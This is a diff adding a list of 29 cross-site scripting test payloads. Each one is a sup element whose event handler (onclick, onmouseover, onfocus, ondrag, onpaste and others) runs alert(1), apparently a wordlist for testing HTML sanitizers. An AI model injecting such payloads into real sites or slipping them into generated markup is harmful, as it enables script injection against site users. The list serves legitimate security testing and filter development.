@@ -1,0 +1,29 @@
+<sup draggable="true" ondrag="alert(1)">test</sup>
+<sup draggable="true" ondragend="alert(1)">test</sup>
+<sup draggable="true" ondragenter="alert(1)">test</sup>
+<sup draggable="true" ondragleave="alert(1)">test</sup>
+<sup draggable="true" ondragstart="alert(1)">test</sup>
+<sup id=x tabindex=1 onactivate=alert(1)></sup>
+<sup id=x tabindex=1 onbeforeactivate=alert(1)></sup>
+<sup id=x tabindex=1 onfocus=alert(1)></sup>
+<sup id=x tabindex=1 onfocusin=alert(1)></sup>
+<sup onbeforecopy="alert(1)" contenteditable>test</sup>
+<sup onbeforecut="alert(1)" contenteditable>test</sup>
+<sup onbeforepaste="alert(1)" contenteditable>test</sup>
+<sup onclick="alert(1)">test</sup>
+<sup oncontextmenu="alert(1)">test</sup>
+<sup oncopy="alert(1)" contenteditable>test</sup>
+<sup oncut="alert(1)" contenteditable>test</sup>
+<sup ondblclick="alert(1)">test</sup>
+<sup onkeydown="alert(1)" contenteditable>test</sup>
+<sup onkeypress="alert(1)" contenteditable>test</sup>
+<sup onkeyup="alert(1)" contenteditable>test</sup>
+<sup onmousedown="alert(1)">test</sup>
+<sup onmouseenter="alert(1)">test</sup>
+<sup onmouseleave="alert(1)">test</sup>
+<sup onmousemove="alert(1)">test</sup>
+<sup onmouseout="alert(1)">test</sup>
+<sup onmouseover="alert(1)">test</sup>
+<sup onmouseup="alert(1)">test</sup>
+<sup onpaste="alert(1)" contenteditable>test</sup>
+<svg><sup onload=alert(1)></sup>
